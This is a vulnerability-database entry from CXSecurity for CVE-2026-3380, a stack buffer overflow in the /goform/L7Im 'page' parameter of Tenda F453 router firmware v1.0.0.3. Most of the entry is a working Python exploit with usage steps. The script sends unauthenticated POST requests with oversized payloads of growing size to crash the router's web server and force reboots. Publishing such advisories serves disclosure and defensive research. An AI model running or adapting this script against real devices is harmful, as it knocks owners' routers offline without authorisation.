---
title: Tenda F453 v1.0.0.3 frmL7ImForm Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2026030001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:36.631393
---

# Tenda F453 v1.0.0.3 frmL7ImForm Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenda F453 v1.0.0.3 frmL7ImForm Buffer Overflow**  **2026.03.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-3380](https://cxsecurity.com/cveshow/CVE-2026-3380/ "Click to see CVE-2026-3380")**  CWE: **[CWE-120 (Classic Buffer Overflow) ,](https://cxsecurity.com/cwe/CWE-120%20%28Classic%20Buffer%20Overflow%29%20%2C "Click to see CWE-120 (Classic Buffer Overflow) ,")** | |

#!/usr/bin/env python3
# Exploit Title: Tenda F453 frmL7ImForm Buffer Overflow
# CVE: CVE-2026-3380
# Date: 2026-03-01
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://www.tenda.com.cn/
# Software Link:
# Affected: Tenda F453 v1.0.0.3
# Tested on: Tenda F453 v1.0.0.3
# Category: Remote
# Platform: Embedded (Linux-based router)
# Exploit Type: Denial of Service / Buffer Overflow
# CVSS: 8.8 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
# Description: Stack-based buffer overflow in /goform/L7Im via the 'page' parameter
# due to unsafe use of sprintf/strcpy in frmL7ImForm function.
# Fixed in:
# Usage:
# python3 exploit.py <target\_ip> [size]
#
# Examples:
# python3 exploit.py 192.168.0.1
# python3 exploit.py 192.168.1.1 2300
#
# Options:
# -- (no additional options implemented)
#
# Notes:
# • For authorized testing / research purposes only
# • Most likely causes httpd crash → device reboot (DoS)
# • Unauthenticated in affected firmware version
#
# How to Use
#
# Step 1:
# Connect to the same network as the target router
#
# Step 2:
# Run the script with the router's LAN IP address
#
# ────────────────────────────────────────────────
import sys
import requests
import urllib.parse
import time
def trigger\_overflow(target, size=2048):
url = f"http://{target}/goform/L7Im"
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/x-www-form-urlencoded",
"Referer": f"http://{target}/",
"Connection": "close",
}
overflow = "A" \* size
data = {
"page": overflow,
"module": "L7Im",
"action": "apply",
}
body = urllib.parse.urlencode(data)
print(f"[\*] Sending to {url}")
print(f" Payload length : {len(overflow)} bytes")
try:
r = requests.post(
url,
data=body,
headers=headers,
timeout=6,
allow\_redirects=False,
verify=False
)
print(f"[+] Got response → HTTP {r.status\_code}")
print(f" Content-Length: {len(r.content)} bytes")
except requests.exceptions.Timeout:
print("[!] TIMEOUT → very likely crashed / httpd died")
except requests.exceptions.ConnectionError as e:
print(f"[!] ConnectionError: {e} → device probably rebooted")
except Exception as e:
print(f"[!] Unexpected error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) < 2:
print("Usage: python3 exploit.py <target\_ip> [size]")
print("Example: python3 exploit.py 192.168.0.1 2300")
sys.exit(1)
target\_ip = sys.argv[1].strip()
payload\_size = int(sys.argv[2]) if len(sys.argv) > 2 else 2048
print(f"[+] CVE-2026-3380 Exploit - Tenda F453 /goform/L7Im")
print(f" Target: {target\_ip}")
print(f" Size : {payload\_size} bytes\n")
for sz in [payload\_size, payload\_size + 512, payload\_size + 1024]:
print(f"\n─── Trying size = {sz} ───")
trigger\_overflow(target\_ip, sz)
time.sleep(2)

**##### References:**

https://nvd.nist.gov/vuln/detail/CVE-2026-3380

https://vuldb.com/?id.348265

https://github.com/Litengzheng/vul\_db/blob/main/F453/vul\_81/README.md

https://www.tenda.com.cn/

(vendor site)
Exploit PoC script (attached or linked in your submission): Python code sending oversized 'page' to /goform/L7Im

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top